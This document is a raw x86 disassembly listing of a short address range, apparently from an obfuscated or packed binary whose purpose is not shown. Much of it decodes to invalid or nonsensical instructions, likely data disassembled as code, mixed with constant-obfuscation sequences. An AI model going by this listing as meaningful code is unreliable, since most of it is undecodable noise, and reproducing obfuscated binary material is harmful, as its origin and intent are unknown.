  41a1e9:	mov    ebx,0xdb6d2e26
  41a1ee:	inc    edi
  41a1ef:	or     ecx,DWORD PTR [edi+0x3a]
  41a1f2:	push   esp
  41a1f3:	mov    ds:0x853e3348,al
  41a1f8:	pushf  
  41a1f9:	loop   0x41a262
  41a1fb:	into   
  41a1fc:	out    0x4,eax
  41a1fe:	pop    eax
  41a1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a200:	mov    dh,0xe5
  41a202:	jp     0x41a1ea
  41a204:	fstp   st(3)
  41a206:	mov    esp,0x7101d242
  41a20b:	xor    ebx,edi
  41a20d:	mov    WORD PTR [eax-0x1783d0aa],fs
  41a213:	out    dx,al
  41a214:	lods   al,BYTE PTR ds:[esi]
  41a215:	pop    edx
  41a216:	xchg   ebp,eax
  41a217:	test   al,0x76
  41a219:	lahf   
  41a21a:	push   ebx
  41a21b:	sub    al,0xd7
  41a21d:	fsub   QWORD PTR [eax+eiz*4+0x25]
  41a221:	pop    ebp
  41a222:	xor    al,BYTE PTR [eax]
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	cmp    dh,bl
  41a2a2:	mov    cl,0xb0
  41a2a4:	sub    ebp,DWORD PTR [ebp+0x12bc1816]
  41a2aa:	sbb    BYTE PTR [eax],bl
  41a2ac:	clc    
  41a2ad:	jbe    0x41a31f
  41a2af:	xor    DWORD PTR [ebx],esi
  41a2b1:	mov    DWORD PTR [edx-0x18bda53c],edx
  41a2b7:	mov    esi,0x1a828ccf
  41a2bc:	adc    DWORD PTR [eax+edx*2+0x42],esp
  41a2c0:	icebp  
  41a2c1:	call   0x374b367c
  41a2c6:	jns    0x41a2e4
  41a2c8:	icebp  
  41a2c9:	sbb    DWORD PTR [ebx],ebp
  41a2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2cc:	mov    ebp,0xa50d2122
  41a2d1:	pop    esi
  41a2d2:	or     ebp,DWORD PTR [edi]
  41a2d4:	out    dx,eax
  41a2d5:	lods   al,BYTE PTR ds:[esi]
  41a2d6:	loopne 0x41a2d4
  41a2d8:	jge    0x41a2b9
  41a2da:	dec    edx
  41a2db:	test   eax,0x54ec9915
  41a2e0:	pop    esp
  41a2e1:	mov    ds:0x74fc4e4,al
  41a2e6:	das    
  41a2e7:	and    edx,DWORD PTR [ebp+0x53]
  41a2ea:	cmp    DWORD PTR [edx],ecx
  41a2ec:	pop    edx
  41a2ed:	loopne 0x41a29f
  41a2ef:	jnp    0x41a28e
  41a2f1:	pop    ss
  41a2f2:	push   ecx
  41a2f3:	jecxz  0x41a2d8
  41a2f5:	test   al,0x2d
  41a2f7:	jne    0x41a2d0
  41a2f9:	mov    bl,0x19
  41a2fb:	push   ecx
  41a2fc:	pop    edi
  41a2fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2fe:	jge    0x41a2f3
  41a300:	mov    DWORD PTR [edx+0x60f81269],edi
  41a306:	sub    DWORD PTR [ebp+edi*8+0x72],edi
  41a30a:	mov    dl,0x69
  41a30c:	adc    al,0x82
  41a30e:	adc    BYTE PTR [ebx-0x695a2545],ah
  41a314:	pop    ecx
  41a315:	xor    ecx,DWORD PTR [edx-0x5c70e971]
  41a31b:	cmp    BYTE PTR [edx+0x47f9b4b0],bh
  41a321:	add    al,0x4f
  41a323:	cmp    DWORD PTR [esi+0x4b],esi
  41a326:	adc    ebp,DWORD PTR [edi+0x47]
  41a329:	stos   DWORD PTR es:[edi],eax
  41a32a:	repnz repz fistp WORD PTR [ebx-0x7d90e99b]
  41a332:	neg    DWORD PTR [esi+edi*1-0x7b874a94]
  41a339:	mov    BYTE PTR [esi+eax*4+0x58],al
  41a33d:	sub    BYTE PTR [ecx+eax*4],0xf1
  41a341:	inc    eax
  41a342:	push   ss
  41a343:	or     al,0xf0
  41a345:	dec    BYTE PTR [edi+0x67fe78f9]
  41a34b:	dec    eax
  41a34c:	inc    eax
  41a34d:	cmp    ch,BYTE PTR [edi+0x1b]
  41a350:	outs   dx,BYTE PTR ds:[esi]
  41a351:	(bad)  
  41a352:	xor    BYTE PTR [ebp-0x478ff37e],dl
  41a358:	int3   
  41a359:	push   esp
  41a35a:	aaa    
  41a35b:	lock stos DWORD PTR es:[edi],eax
  41a35d:	fiadd  DWORD PTR [edx-0x25]
  41a360:	icebp  
  41a361:	add    eax,0x74439374
  41a366:	enter  0x10e,0x3a
  41a36a:	les    eax,FWORD PTR [edi+0x77169a83]
  41a370:	scas   eax,DWORD PTR es:[edi]
  41a371:	xor    DWORD PTR [ecx+0x2ab11497],ecx
  41a377:	icebp  
  41a378:	xor    eax,0x9aa6f644
  41a37d:	xor    eax,0xf156033b
  41a382:	and    eax,0xfc7f9512
  41a387:	xchg   ebx,eax
  41a388:	push   esi
  41a389:	aam    0x89
  41a38b:	test   DWORD PTR gs:[edx],ebp
  41a38e:	dec    ecx
  41a38f:	and    al,BYTE PTR [eax+ecx*4-0x3c]
  41a393:	outs   dx,DWORD PTR ds:[esi]
  41a394:	cli    
  41a395:	in     eax,dx
  41a396:	cmp    dh,BYTE PTR [eax+0x230c6a4d]
  41a39c:	dec    eax
  41a39d:	xchg   DWORD PTR [ecx],ebx
  41a39f:	lea    ebx,[ecx+0x952a564]
  41a3a5:	sbb    eax,0x7d00110c
  41a3aa:	cwde   
  41a3ab:	lds    ecx,FWORD PTR [edi-0x6b]
  41a3ae:	push   ss
  41a3af:	and    eax,DWORD PTR [ebx+0x5e]
  41a3b2:	test   dh,dl
  41a3b4:	mov    edi,0x867a62d
  41a3b9:	sub    al,0xab
  41a3bb:	in     al,dx
  41a3bc:	test   edi,edi
  41a3be:	mov    ch,0x3f
  41a3c0:	sbb    dl,bl
  41a3c2:	and    BYTE PTR [ebp-0x41],al
  41a3c5:	mov    dh,0xc3
  41a3c7:	inc    ebx
  41a3c8:	scas   al,BYTE PTR es:[edi]
  41a3c9:	cmp    DWORD PTR [esp+edx*8-0x45],esp
  41a3cd:	and    bh,BYTE PTR [ebx+0x193a5259]
  41a3d3:	dec    ebp
  41a3d4:	arpl   WORD PTR ds:0x2b360ac8,cx
  41a3da:	fwait
  41a3db:	(bad)  
  41a3dc:	mov    cl,0x4d
  41a3de:	(bad)  
  41a3df:	jbe    0x41a395
  41a3e1:	int    0x20
  41a3e3:	sub    dh,BYTE PTR [edx+0x3b87c989]
  41a3e9:	mov    cl,0x8e
  41a3eb:	push   cs
  41a3ec:	mov    dh,0xa5
  41a3ee:	cmp    ch,dh
  41a3f0:	loope  0x41a38a
  41a3f2:	sbb    eax,0x958793dd
  41a3f7:	jb     0x41a3e8
  41a3f9:	xor    DWORD PTR [ebx-0xc6b2514],esi
  41a3ff:	cli    
  41a400:	and    esp,DWORD PTR [edx+0x22326c55]
  41a406:	inc    ebx
  41a407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a408:	(bad)  
  41a409:	test   eax,0xcb47c69e
  41a40e:	push   0x236c92
  41a413:	push   ecx
  41a414:	int3   
  41a415:	sub    eax,0xe767e4cb
  41a41a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41b:	in     al,dx
  41a41c:	sahf   
  41a41d:	mov    ds:0x56a478db,eax
  41a422:	push   es
  41a423:	neg    DWORD PTR [ebx+0x2]
  41a426:	or     eax,0x296121ec
  41a42b:	not    BYTE PTR [ebp+ebx*8+0x5]
  41a42f:	(bad)  
  41a430:	jecxz  0x41a45b
  41a432:	out    0x66,eax
  41a434:	pop    ebp
  41a435:	stos   DWORD PTR es:[edi],eax
  41a436:	sub    al,0x9b
  41a438:	bound  esi,QWORD PTR [esp+ebx*1+0x50]
  41a43c:	cmp    BYTE PTR [edx+0x10275582],0x96
  41a443:	retf   0x823e
  41a446:	rcl    DWORD PTR [edi+0x736ef42d],1
  41a44c:	shl    BYTE PTR [edx-0x78],0xd8
  41a450:	std    
  41a451:	add    bl,BYTE PTR [edx+0x49]
  41a454:	mov    eax,0x6d641f81
  41a459:	add    BYTE PTR [eax-0x56],dl
  41a45c:	pop    ds
  41a45d:	sub    DWORD PTR [ecx-0x40],ecx
  41a460:	fcomip st,st(6)
  41a462:	fld    QWORD PTR [ecx-0x78]
  41a465:	cmp    DWORD PTR [esp+edx*1-0x39],0x2c9637f
  41a46d:	(bad)  
  41a46e:	fnsave [eax+0x70]
  41a471:	out    0xcd,eax
  41a473:	or     edx,edi
  41a475:	cs sub eax,0x8a3a7e01
  41a47b:	xchg   ebp,eax
  41a47c:	dec    edi
  41a47d:	adc    BYTE PTR [eax-0x6a],ch
  41a480:	dec    edi
  41a481:	add    DWORD PTR [eax-0x45],edx
  41a484:	jbe    0x41a489
  41a486:	adc    al,0xbd
  41a488:	loopne 0x41a414
  41a48a:	ret    
  41a48b:	push   edi
  41a48c:	cmc    
  41a48d:	fimul  WORD PTR [ecx]
  41a48f:	scas   al,BYTE PTR es:[edi]
  41a490:	pop    ss
  41a491:	mov    ebp,0xcf822857
  41a496:	inc    edi
  41a497:	test   BYTE PTR ds:0x6b4c6ba7,dh
  41a49d:	inc    ebp
  41a49e:	pop    esi
  41a49f:	fs push edx
  41a4a1:	ror    DWORD PTR [eax+0x7f077aa2],cl
  41a4a7:	ja     0x41a42d
  41a4a9:	mov    cl,dh
  41a4ab:	xchg   ebx,eax
  41a4ac:	and    DWORD PTR [ebx+0x79],esp
  41a4af:	arpl   WORD PTR [edi-0x5896823c],dx
  41a4b5:	mov    esi,edi
  41a4b7:	adc    al,0xe2
  41a4b9:	dec    edi
  41a4ba:	jo     0x41a4a0
  41a4bc:	nop
  41a4bd:	xor    bh,cl
  41a4bf:	enter  0x68b,0x23
  41a4c3:	jb     0x41a51d
  41a4c5:	xor    eax,0xb35bc2a7
  41a4ca:	mov    ebx,0xff772fda
  41a4cf:	push   ecx
  41a4d0:	push   0xec3ef188
  41a4d5:	fsub   DWORD PTR [edx-0x5a069c26]
  41a4db:	cs jne 0x41a537
  41a4de:	in     eax,dx
  41a4df:	sub    esp,ebx
  41a4e1:	jae    0x41a4fc
  41a4e3:	ins    BYTE PTR es:[edi],dx
  41a4e4:	xchg   edx,eax
  41a4e5:	hlt    
  41a4e6:	ja     0x41a559
  41a4e8:	pop    ss
  41a4e9:	(bad)  
  41a4ea:	enter  0x6157,0xd
  41a4ee:	dec    edi
  41a4ef:	hlt    
  41a4f0:	and    al,0xc6
  41a4f2:	push   ebx
  41a4f3:	retf   
  41a4f4:	and    eax,0x43219fc9
  41a4f9:	fsubr  QWORD PTR [edx]
  41a4fb:	js     0x41a4f0
  41a4fd:	pusha  
  41a4fe:	fcomp  st(6)
  41a500:	sar    DWORD PTR [ecx],0x76
  41a503:	mov    ebx,DWORD PTR ds:[ebp-0x10]
  41a507:	xchg   edx,eax
  41a508:	jns    0x41a56e
  41a50a:	push   0xffffffb8
  41a50c:	in     eax,dx
  41a50d:	push   ecx
  41a50e:	sbb    eax,DWORD PTR [esi]
  41a510:	mov    ecx,0xba59004a
  41a515:	iret   
  41a516:	das    
  41a517:	xor    eax,0xbb9c148a
  41a51c:	and    cl,BYTE PTR [eax-0x35795b1e]
  41a522:	fucomp st(4)
  41a524:	ret    0x6844
  41a527:	leave  
  41a528:	(bad)  
  41a529:	adc    eax,0x23b20d63
  41a52e:	or     al,0xb5
  41a530:	sbb    BYTE PTR [ecx+0x45343756],ah
  41a536:	xor    ch,BYTE PTR [ecx+0x3c840335]
  41a53c:	jbe    0x41a540
  41a53e:	inc    ecx
  41a53f:	sbb    al,0xc0
  41a541:	lods   al,BYTE PTR ds:[esi]
  41a542:	xor    al,0x2e
  41a544:	and    BYTE PTR [esi+0x6a11531b],bh
  41a54a:	fsub   QWORD PTR [eax+0x1b8881ea]
  41a550:	mov    ds:0x55fe9586,eax
  41a555:	mov    esi,ecx
  41a557:	ins    BYTE PTR es:[edi],dx
  41a558:	adc    DWORD PTR [edx+0x6a],edi
  41a55b:	cdq    
  41a55c:	arpl   ax,di
  41a55e:	cdq    
  41a55f:	hlt    
  41a560:	out    dx,al
  41a561:	jg     0x41a5be
  41a563:	inc    esi
  41a564:	inc    eax
  41a565:	pop    ebp
  41a566:	sub    eax,0xaa2fd87c
  41a56b:	fidiv  WORD PTR [eax+0x76d813c9]
  41a571:	jmp    FWORD PTR [ebx+edx*8]
  41a574:	imul   edx,DWORD PTR [esi+ebp*4],0x2d4d7a3b
  41a57b:	shr    DWORD PTR [edx-0x54c56b27],0x18
  41a582:	mov    eax,0xccb68829
  41a587:	mov    ds:0x86a4ef60,al
  41a58c:	(bad)  
  41a58e:	inc    eax
  41a58f:	fsub   st,st(7)
  41a591:	mov    ecx,0xbc8c6e45
  41a596:	add    eax,0xdb95ac33
  41a59b:	into   
  41a59c:	dec    edi
  41a59d:	test   bh,dh
  41a59f:	in     eax,0x92
  41a5a1:	mov    al,ds:0x3029e00d
  41a5a6:	mov    esi,0xfa6e1f42
  41a5ab:	fistp  QWORD PTR [edx-0x679a8588]
  41a5b1:	inc    esp
  41a5b2:	(bad)  
  41a5b3:	cmp    al,0xf5
  41a5b5:	xor    ecx,DWORD PTR [edi+0x10e26497]
  41a5bb:	pop    es
  41a5bc:	push   esp
  41a5bd:	push   edi
  41a5be:	mov    edx,0xe9a3e06a
  41a5c3:	mov    esp,0x8851c60c
  41a5c8:	cmp    bl,ah
  41a5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5cb:	sahf   
  41a5cc:	jnp    0x41a5c6
  41a5ce:	enter  0x6480,0xe1
  41a5d2:	sahf   
  41a5d3:	test   al,0x35
  41a5d5:	jge    0x41a624
  41a5d7:	adc    eax,0x83e9fc61
  41a5dc:	inc    esi
  41a5dd:	mov    cs,WORD PTR [edx+edi*2-0x531d5d8e]
  41a5e4:	frstor [edi]
  41a5e6:	cmp    edx,DWORD PTR ds:0x52e117fa
  41a5ec:	or     al,0x8b
  41a5ee:	popf   
  41a5ef:	ins    DWORD PTR es:[edi],dx
  41a5f0:	cmp    bh,al
  41a5f2:	mov    edi,0x39adafea
  41a5f7:	push   edx
  41a5f8:	lea    ebx,[edx+0x7b]
  41a5fb:	test   ebx,0x91e2ee1b
  41a601:	adc    ch,BYTE PTR [eax]
  41a603:	push   es
  41a604:	in     al,dx
  41a605:	das    
  41a606:	dec    eax
  41a607:	mov    eax,0xd7e3c122
  41a60c:	leave  
  41a60d:	inc    edx
  41a60e:	daa    
  41a60f:	adc    DWORD PTR [ebx+0x1113eaf5],eax
  41a615:	add    DWORD PTR [eax-0x31],0xffffffa5
  41a619:	xlat   BYTE PTR ds:[ebx]
  41a61a:	cld    
  41a61b:	xchg   edx,eax
  41a61c:	adc    al,0x91
  41a61e:	cli    
  41a61f:	sbb    al,0x3c
  41a621:	xor    dl,ah
  41a623:	icebp  
  41a624:	cwde   
  41a625:	dec    ebx
  41a626:	mov    eax,ebp
  41a628:	cmc    
  41a629:	mov    al,ah
  41a62b:	inc    edi
  41a62c:	test   al,0xaf
  41a62e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62f:	jmp    0x41a644
  41a631:	outs   dx,BYTE PTR ds:[esi]
  41a632:	fld    DWORD PTR ds:0xf2925aff
  41a638:	dec    ebx
  41a639:	scas   al,BYTE PTR es:[edi]
  41a63a:	push   ss
  41a63b:	dec    eax
  41a63c:	call   0x523504c0
  41a641:	mov    es,WORD PTR [ecx-0x3b]
  41a644:	dec    ebp
  41a645:	mov    ds:0x3325097f,al
  41a64a:	ja     0x41a605
  41a64c:	fsub   QWORD PTR [esp+esi*4]
  41a64f:	sub    al,ch
  41a651:	stos   DWORD PTR es:[edi],eax
  41a652:	dec    ecx
  41a653:	inc    edi
  41a654:	shl    DWORD PTR [ecx-0x47e5cb8],1
  41a65a:	mov    bl,0xc0
  41a65c:	sbb    DWORD PTR [edi+0x2b],edi
  41a65f:	ror    DWORD PTR [ebx+0x1b50244c],0xd3
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x42206a
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	inc    esi
  41a749:	jp     0x41a761
  41a74b:	stos   BYTE PTR es:[edi],al
  41a74c:	iret   
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1-0x29f7e7e8],bh
  41a756:	push   ss
  41a757:	sub    DWORD PTR [edx],eax
  41a759:	imul   ecx,esp,0x8
  41a75c:	clc    
  41a75d:	aas    
  41a75e:	ror    DWORD PTR [esi],cl
  41a760:	xchg   esi,eax
  41a761:	cld    
  41a762:	xchg   esi,eax
  41a763:	dec    eax
  41a764:	sbb    bl,dh
  41a766:	jl     0x41a765
  41a768:	(bad)  
  41a769:	fild   DWORD PTR [edx-0x75]
  41a76c:	pop    es
  41a76d:	add    bl,dh
  41a76f:	bound  esi,QWORD PTR [edi+edi*4]
  41a772:	je     0x41a7d9
  41a774:	aam    0x32
  41a776:	sub    eax,0x8aefcbc6
  41a77b:	ja     0x41a74f
  41a77d:	cli    
  41a77e:	test   eax,0x4faf91d9
  41a783:	mov    BYTE PTR [ebp+0x3a],dh
  41a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a787:	sbb    ch,BYTE PTR [ebp-0x2b]
  41a78a:	fisttp QWORD PTR [edx]
  41a78c:	addr16 push ds
  41a78e:	fld    QWORD PTR [eax-0x6c]
  41a791:	les    esp,FWORD PTR [ecx]
  41a793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a794:	lods   eax,DWORD PTR ds:[esi]
  41a795:	add    eax,DWORD PTR [edx-0x41]
  41a798:	jne    0x41a7cd
  41a79a:	stos   DWORD PTR es:[edi],eax
  41a79b:	xor    al,0x95
  41a79d:	add    eax,0xa24ec5d0
  41a7a2:	and    al,0x44
  41a7a4:	sbb    eax,0x5cf5478f
  41a7a9:	aad    0x14
  41a7ab:	mov    ch,0x61
  41a7ad:	adc    bh,bl
  41a7af:	sub    edi,edx
  41a7b1:	dec    esp
  41a7b2:	je     0x41a747
  41a7b4:	jmp    0x41a7b1
  41a7b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b7:	leave  
  41a7b8:	je     0x41a791
  41a7ba:	(bad)  
  41a7bb:	das    
  41a7bc:	inc    edi
  41a7bd:	or     BYTE PTR ss:[edx+0x342edb75],bh
  41a7c4:	sbb    ch,0x6f
  41a7c7:	popa   
  41a7c8:	shl    esi,cl
  41a7ca:	dec    esp
  41a7cb:	je     0x41a7c3
  41a7cd:	sub    al,0x28
  41a7cf:	and    al,0x43
  41a7d1:	xor    ah,BYTE PTR [edx]
  41a7d3:	adc    al,0xe6
  41a7d5:	retf   
  41a7d6:	(bad)  
  41a7d7:	fwait
  41a7d8:	call   0xedb3:0x457d75da
  41a7df:	arpl   WORD PTR [edx],sp
  41a7e1:	and    BYTE PTR [edi],0xb5
  41a7e4:	cmc    
  41a7e5:	repz sub al,0x52
  41a7e8:	cmp    BYTE PTR [ebx+0x38],bh
  41a7eb:	or     eax,DWORD PTR [edx+0x25]
  41a7ee:	pop    ebp
  41a7ef:	in     eax,0x89
  41a7f1:	sub    BYTE PTR [esi-0xf],cl
  41a7f4:	loopne 0x41a804
  41a7f6:	sub    ecx,eax
  41a7f8:	mov    dh,0x58
  41a7fa:	push   ebp
  41a7fb:	push   ds
  41a7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7fd:	jle    0x41a79e
  41a7ff:	mov    dl,0x73
  41a801:	mov    ebx,DWORD PTR [eax+0x7a42479]
  41a807:	and    eax,esp
  41a809:	bound  esp,QWORD PTR [esi-0x1d994bb5]
  41a80f:	and    ch,cl
  41a811:	mov    esi,0x8a5e944a
  41a816:	jmp    0x41a80b
  41a818:	ja     0x41a7c0
  41a81a:	dec    ebp
  41a81b:	or     esi,DWORD PTR [ebp-0x65595165]
  41a821:	retf   0xc0aa
  41a824:	jo     0x41a7ee
  41a826:	test   al,0xa1
  41a828:	loopne 0x41a83e
  41a82a:	adc    al,0xa
  41a82c:	inc    ecx
  41a82d:	pop    ds
  41a82e:	lods   al,BYTE PTR ds:[esi]
  41a82f:	push   ss
  41a830:	ins    DWORD PTR es:[edi],dx
  41a831:	test   al,0x62
  41a833:	xor    al,0x32
  41a835:	push   sp
  41a837:	std    
  41a838:	and    BYTE PTR [ebx-0x35757213],0x4
  41a83f:	sti    
  41a840:	inc    edi
  41a841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a842:	mov    eax,ds:0x140a2b49
  41a847:	pop    edx
  41a848:	push   ss
  41a849:	in     al,0x8b
  41a84b:	xchg   edi,eax
  41a84c:	popf   
  41a84d:	inc    edi
  41a84e:	adc    edi,ecx
  41a850:	mov    dh,0x5e
  41a852:	or     dh,dh
  41a854:	int    0x16
  41a856:	adc    ebp,DWORD PTR [edi+0x150d1860]
  41a85c:	dec    esi
  41a85d:	clc    
  41a85e:	aaa    
  41a85f:	mov    ds:0xbbb87320,eax
  41a864:	xchg   edi,eax
  41a865:	mov    ecx,0x2a3a438b
  41a86a:	adc    al,BYTE PTR [esi+edx*4-0x2b]
  41a86e:	sbb    al,0x24
  41a870:	loopne 0x41a817
  41a872:	dec    edi
  41a873:	fcmovu st,st(0)
  41a875:	cmp    dh,dl
  41a877:	test   BYTE PTR ds:0xb7e0569a,al
  41a87d:	inc    ebp
  41a87e:	mov    ebx,0x556106d5
  41a883:	xchg   ebx,eax
  41a884:	aaa    
  41a885:	jns    0x41a853
  41a887:	cmp    ebp,esi
  41a889:	or     edi,DWORD PTR [edi]
  41a88b:	mov    cl,0xe8
  41a88d:	jmp    DWORD PTR [edx]
  41a88f:	add    eax,0x7b22ebef
  41a894:	arpl   WORD PTR [ecx],sp
  41a896:	ja     0x41a879
  41a898:	rcr    DWORD PTR [eax],0x3e
  41a89b:	daa    
  41a89c:	add    ch,BYTE PTR [esi-0x9]
  41a89f:	inc    eax
  41a8a0:	cdq    
  41a8a1:	jp     0x41a8af
  41a8a3:	inc    edi
  41a8a4:	mov    eax,ds:0x34e97974
  41a8a9:	js     0x41a8dd
  41a8ab:	fsubr  QWORD PTR [edi]
  41a8ad:	aas    
  41a8ae:	lock mul DWORD PTR [edi]
  41a8b1:	and    DWORD PTR [edi+0x6],ebx
  41a8b4:	and    al,0x58
  41a8b6:	scas   al,BYTE PTR es:[edi]
  41a8b7:	cdq    
  41a8b8:	lea    esp,[eax]
  41a8ba:	out    0x21,al
  41a8bc:	clc    
  41a8bd:	(bad)  
  41a8be:	jle    0x41a92e
  41a8c0:	shl    DWORD PTR [ebx],cl
  41a8c2:	add    esi,0x41
  41a8c5:	mov    ebx,0x5fe15a58
  41a8ca:	ss dec edi
  41a8cc:	push   ebx
  41a8cd:	or     bl,BYTE PTR [edi-0x50198ff]
  41a8d3:	push   ebx
  41a8d4:	dec    ebx
  41a8d5:	dec    eax
  41a8d6:	popa   
  41a8d7:	inc    ebp
  41a8d8:	dec    esi
  41a8d9:	retf   0x6b0b
  41a8dc:	dec    esp
  41a8dd:	inc    ebp
  41a8de:	sbb    DWORD PTR [edx],edi
  41a8e0:	xchg   ebx,eax
  41a8e1:	push   0x71
  41a8e3:	push   ebx
  41a8e4:	outs   dx,BYTE PTR ds:[esi]
  41a8e5:	int3   
  41a8e6:	adc    BYTE PTR [esi+0x7abca548],cl
  41a8ec:	mov    eax,0x7049fbfe
  41a8f1:	scas   al,BYTE PTR es:[edi]
  41a8f2:	clc    
  41a8f3:	mov    bl,0xf7
  41a8f5:	call   0x89a12eee
  41a8fa:	ja     0x41a8d4
  41a8fc:	or     esi,DWORD PTR [ecx-0x7]
  41a8ff:	stos   BYTE PTR es:[edi],al
  41a900:	aam    0xc9
  41a902:	jno    0x41a8e2
  41a904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a905:	fisubr DWORD PTR ds:0xa9cfaefd
  41a90b:	or     dl,BYTE PTR [ebx+0x4e]
  41a90e:	mov    ds:0xec8d44fa,al
  41a913:	pop    ds
  41a914:	xor    eax,DWORD PTR ds:[ecx+0x52]
  41a918:	nop
  41a919:	jns    0x41a902
  41a91b:	ret    
  41a91c:	mov    edi,0x918c4658
  41a921:	inc    ebp
  41a922:	test   al,0xa9
  41a924:	outs   dx,BYTE PTR ds:[esi]
  41a925:	mov    esi,0x5ac27148
  41a92a:	cli    
  41a92b:	mov    WORD PTR [ebx+0x19],ds
  41a92e:	push   edx
  41a92f:	xchg   edi,eax
  41a930:	mov    edx,0x4c4ceedf
  41a935:	mov    bh,0x4f
  41a937:	les    ebx,FWORD PTR [edi]
  41a939:	shl    BYTE PTR [eax],1
  41a93b:	push   ss
  41a93c:	inc    ecx
  41a93d:	xchg   BYTE PTR [eax+0x2c],dh
  41a940:	pusha  
  41a941:	cld    
  41a942:	ins    DWORD PTR es:[edi],dx
  41a943:	fbld   TBYTE PTR [ebp+0x3888a5f3]
  41a949:	cmp    DWORD PTR [eax],eax
  41a94b:	add    eax,0x23d83b51
  41a950:	ja     0x41a8f5
  41a952:	dec    ecx
  41a953:	lahf   
  41a954:	int    0x35
  41a956:	mov    WORD PTR [eax+0x68fa61e7],es
  41a95c:	xchg   edx,eax
  41a95d:	loope  0x41a9b3
  41a95f:	xor    DWORD PTR [eax+0x7],edi
  41a962:	adc    eax,0xef153223
  41a967:	dec    esi
  41a968:	fdivr  QWORD PTR [ebx+edi*2+0x11e677db]
  41a96f:	enter  0x7841,0x7
  41a973:	dec    ebx
  41a974:	add    bl,bh
  41a976:	mov    eax,ds:0x12031b95
  41a97b:	(bad)  
  41a97c:	popf   
  41a97d:	pusha  
  41a97e:	gs dec edi
  41a980:	mov    bh,BYTE PTR [ebx]
  41a982:	or     al,0x35
  41a984:	sub    eax,0x99276435
  41a989:	push   ebx
  41a98a:	add    eax,0x91a1d68c
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	ss mov cl,0x73
  41a993:	adc    dh,al
  41a995:	(bad)  
  41a996:	adc    DWORD PTR [edi-0x7c],eax
  41a999:	push   0x8a8b2cc5
  41a99e:	sub    bl,BYTE PTR [esi-0x1c]
  41a9a1:	xchg   edx,eax
  41a9a2:	dec    edx
  41a9a3:	out    dx,al
  41a9a4:	sbb    DWORD PTR [eax],0x73
  41a9a7:	push   edi
  41a9a8:	lahf   
  41a9a9:	pop    esp
  41a9aa:	iret   
  41a9ab:	out    0xa1,al
  41a9ad:	in     al,dx
  41a9ae:	mov    edi,0x9ab3a256
  41a9b3:	inc    ebp
  41a9b4:	inc    edx
  41a9b5:	cld    
